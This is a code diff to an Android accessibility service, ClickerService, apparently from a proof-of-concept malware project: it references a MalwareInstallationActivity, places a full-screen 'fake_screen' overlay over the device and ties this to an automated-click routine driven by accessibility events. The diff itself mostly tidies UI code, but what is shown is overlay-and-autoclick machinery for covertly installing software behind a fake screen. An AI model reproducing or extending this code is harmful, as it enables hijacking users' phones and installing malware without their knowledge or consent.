@@ -2,7 +2,6 @@ package com.andrei.host;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
-import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.os.Handler;
 import android.view.Gravity;
@@ -13,7 +12,6 @@ import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.FrameLayout;
 import android.widget.ImageView;
-import android.widget.TextView;
 import android.widget.Toast;
 
 import com.andrei.host.presentation.ui.MalwareInstallationActivity;
@@ -22,7 +20,6 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
 
     public static final String TAG = ClickerService.class.getSimpleName();
     private FrameLayout mLayout;
-    private boolean mUiChanged;
     private View mRootView;
     private WindowManager mWindowManager;
 
@@ -53,7 +50,7 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
         lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
         lp.gravity = Gravity.TOP;
         LayoutInflater inflater = LayoutInflater.from(this);
-        mRootView = inflater.inflate(R.layout.service_optional_layout, mLayout);
+        mRootView = inflater.inflate(R.layout.accessibilty_service_layout, mLayout);
         mWindowManager.addView(mLayout, lp);
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.flags = AccessibilityServiceInfo.DEFAULT |
@@ -64,6 +61,10 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.packageNames = null;
         setServiceInfo(info);
+
+//        //set the fake toolbar
+//        Toolbar toolbar = (Toolbar) mRootView.findViewById(R.id.toolbar);
+//        toolbar.setTitle(R.string.title_activity_malware_install);
     }
 
     private void automateCLicks(AccessibilityEvent event) {
@@ -123,9 +124,8 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
     }
 
     private void createFakeOverlay() {
-        mUiChanged = true;
-        TextView tvRedBar = (TextView) mRootView.findViewById(R.id.red_bar);
-        tvRedBar.setBackgroundColor(Color.BLACK);
+//        TextView tvRedBar = (TextView) mRootView.findViewById(R.id.red_bar);
+//        tvRedBar.setBackgroundColor(Color.BLACK);
 
         ImageView imageView = (ImageView) mRootView.findViewById(R.id.fake_screen);
         imageView.setVisibility(View.VISIBLE);
@@ -136,8 +136,8 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
     }
 
     private void removeFakeOverlay() {
-        TextView tvRedBar = (TextView) mRootView.findViewById(R.id.red_bar);
-        tvRedBar.setBackgroundColor(Color.RED);
+//        TextView tvRedBar = (TextView) mRootView.findViewById(R.id.red_bar);
+//        tvRedBar.setBackgroundColor(Color.RED);
 
         ImageView imageView = (ImageView) mRootView.findViewById(R.id.fake_screen);
         imageView.setVisibility(View.GONE);
@@ -145,7 +145,6 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
         WindowManager.LayoutParams params = (WindowManager.LayoutParams) mRootView.getLayoutParams();
         params.height = WindowManager.LayoutParams.WRAP_CONTENT;
         mWindowManager.updateViewLayout(mRootView, params);
-        mUiChanged = false;
     }
 
 //    private void setScreenMode(boolean fullscreen) {
